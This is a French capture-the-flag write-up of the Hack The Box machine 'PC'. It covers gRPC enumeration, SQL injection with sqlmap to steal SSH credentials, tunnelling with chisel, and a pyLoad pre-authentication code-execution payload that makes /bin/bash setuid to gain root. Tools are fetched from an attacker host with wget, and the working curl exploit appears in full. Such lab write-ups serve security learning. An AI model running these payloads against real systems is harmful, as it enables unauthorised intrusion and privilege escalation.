  # PC

	echo "10.10.11.214 pc.htb" >> /etc/hosts
	sudo masscan -p1-65535,U:1-65535 10.10.11.214 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 10.10.11.214 -oN nmap.txt
	feroxbuster --silent -u http://pc.htb
	
Scans classiques.

	PORT STATE SERVICE VERSION  
	22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)  
	50051/tcp open unknown


En faisant des recherches sur le port 50051, on trouve qu'il peut être utilisé par gRPC : https://fr.community.intersystems.com/post/grpc-de-quoi-sagit-il-et-le-hello-world 

En tentant de s'y connecter avec netcat on reçoit juste une chaîne de caractères étrange : "▒?��?�� ?"

J'ai trouvé un outil pour communiquer facilement avec cette interface : 
https://github.com/fullstorydev/grpcui 

	go install github.com/fullstorydev/grpcui/cmd/grpcui@latest	
	/home/timothe/go/bin/grpcui -plaintext 10.10.11.214:50051
	firefox http://127.0.0.1:42669/

On a la possibilité de s'authentifier, de s'enregistrer ou d'obtenir des informations. 
S'enregistrer nous donne un token de la forme suivante : 

	token b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiQUFBQUEiLCJleHAiOjE2OTQ5MDIzMTh9.493D_bRSipMj00glZCwtsXkGs7NtEkhy_n6rQdjKmdM'

Je n'ai rien trouvé de concret dans l'application elle-même. En revanche, en cherchant des exploits pour gRPC, j'ai trouvé un article extrêmement intéressant : https://medium.com/@ibm_ptc_security/grpc-security-series-part-3-c92f3b687dd9

La partie la plus attirante est celle sur les injections SQL, j'ai décidé de lancer SQLMap en tâche de fond en vérifiant le reste : 

	sqlmap -r requete_2.txt --dump

Voici la requête interceptée avec Burp et utilisée comme schéma d'attaque : 

	POST /invoke/SimpleApp.getInfo HTTP/1.1
	Host: 127.0.0.1:39031
	Content-Length: 211
	sec-ch-ua: 
	sec-ch-ua-mobile: ?0
	User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
	Content-Type: application/json
	Accept: */*
	X-Requested-With: XMLHttpRequest
	x-grpcui-csrf-token: JKuKfkzRToZjOiB5ex86Vr9Y_y4L4hkXv6TP7PbqWQ4
	sec-ch-ua-platform: ""
	Origin: http://127.0.0.1:39031
	Sec-Fetch-Site: same-origin
	Sec-Fetch-Mode: cors
	Sec-Fetch-Dest: empty
	Referer: http://127.0.0.1:39031/
	Accept-Encoding: gzip, deflate
	Accept-Language: en-US,en;q=0.9
	Cookie: _grpcui_csrf_token=JKuKfkzRToZjOiB5ex86Vr9Y_y4L4hkXv6TP7PbqWQ4
	Connection: close

	{"timeout_seconds":1,"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiQUFBQUEiLCJleHAiOjE2OTQ5MDIzMTh9.493D_bRSipMj00glZCwtsXkGs7NtEkhy_n6rQdjKmdM"}],"data":[{"id":"1"}]}


Bien penser à utiliser le token généré pour utiliser la fonction "getInfo", cela ne fonctionnait pas sans lui. 

On obtient les credentials pour le compte "admin" et le compte "sau". Ce dernier semble fonctionner en SSH :

	ssh sau@10.10.11.214
	cat user.txt	 


## Élévation de privilèges


	wget http://10.10.16.37/linpeas.sh
	chmod u+x linpeas.sh
	./linpeas.sh > r.txt
	less -R r.txt

Dans le rapport on trouve quelques ports intéressants qui n'écoutent qu'en local : 

	tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN -  
	tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN -  
	tcp 0 0 127.0.0.1:8000 0.0.0.0:* LISTEN -  
	tcp 0 0 0.0.0.0:9666 0.0.0.0:* LISTEN -  
	tcp6 0 0 :::22 :::* LISTEN -  
	tcp6 0 0 :::50051 :::* LISTEN -

En fouillant dans les processus, on voit que le port 8000 semble être un service Web.

Mise en place d'un tunnel avec Chisel pour accéder au site web interne avec ma propre machine : 

	wget http://10.10.16.37/chisel_linux_1.7.7
	chmod u+x chisel_linux_1.7.7
	./chisel_linux_1.7.7 client 10.10.16.37:9999 R:8001:127.0.0.1:8000
	...
	./chisel_linux_1.7.7 server -reverse -p 9999 --socks5
	firefox http://127.0.0.1:8001/

On arrive sur un formulaire de login et on voit que le site utilise pyLoad. 
Les credentials classiques ne marchent pas mais il semble exister des exploits sans authentification : 

https://huntr.dev/bounties/3fd606f7-83e1-4265-b083-2e1889a05e65/

Code du PoC : 

	curl -i -s -k -X $'POST' \
    --data-binary $'jk=pyimport%20os;os.system(\"touch%20/tmp/pwnd\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
    $'http://127.0.0.1:8001/flash/addcrypted2'


En lançant ce code d'exemple sur ma machine, puis en vérifiant le répertoire /tmp sur la machine cible, on voit qu'un fichier "pwnd" a bien été créé et qu'il appartient à root. 

J'ai choisi de modifier le fichier /bin/bash en lui mettant un chmod 4777 au lieu de passer par un reverse-shell, pour terminer plus rapidement :

	curl -i -s -k -X $'POST' \
    --data-binary $'jk=pyimport%20os;os.system(\"chmod%204777%20/bin/bash\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
    $'http://127.0.0.1:8001/flash/addcrypted2'

Il n'y a plus qu'à retourner sur la machine cible :

	/bin/bash -p
	cat /root/root.txt


